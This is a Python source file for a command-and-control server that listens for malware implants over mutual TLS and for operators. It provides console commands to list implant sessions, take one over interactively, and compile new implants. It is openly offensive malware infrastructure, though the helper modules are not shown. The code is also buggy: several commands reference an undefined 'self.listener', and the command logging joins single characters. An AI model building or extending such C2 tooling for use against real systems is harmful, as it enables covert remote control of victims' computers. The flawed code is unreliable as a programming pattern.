#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging


from mtls import mtls, clienthandler
from generate.generate import generate
from queue import Queue
from handler.handler import Handler



class C2Server(object):

    def __init__(self):
        ## Generating stuff for implant comms ##
        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
        self.handler = Handler(self.requestq)
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
        print("Listening for implants...")
        self.operatorlistener = clienthandler.Listener()
        print("Listening for operators...")


        self.shutdown = 0

    def serverMain(self):
        while self.shutdown == 0:
            userin = input("$ ")
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            commandStr = ' '.join(userin)
            logging.info("Command: " + commandStr)
            self.executecommand(userin.split())

    def executecommand(self, command):
        #command is an array of strings
        if len(command) < 1:
            print("Invalid Command")
            return("Invalid Command")
        elif command[0] == "sessions":
            for id in self.listener.sessions.list():
                print(id)
        # Interact with a session
        elif command[0] == "use":
            if len(command) == 2:
                conn, addr = self.listener.sessions.get(command[1]) 
                print(f"Using session with {addr}")
                mtls.session(conn) #this will hijack the the server essentially
            else:
                print("Usage: use <session>")
        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.listener.client_certs)
        #elif command[0] == "users":
        #    self.printOperators()
        else:
            print("Unknown Command")
            return("Unknown Command")


def main():
    C2Server().serverMain()


if __name__ == "__main__":
    main()
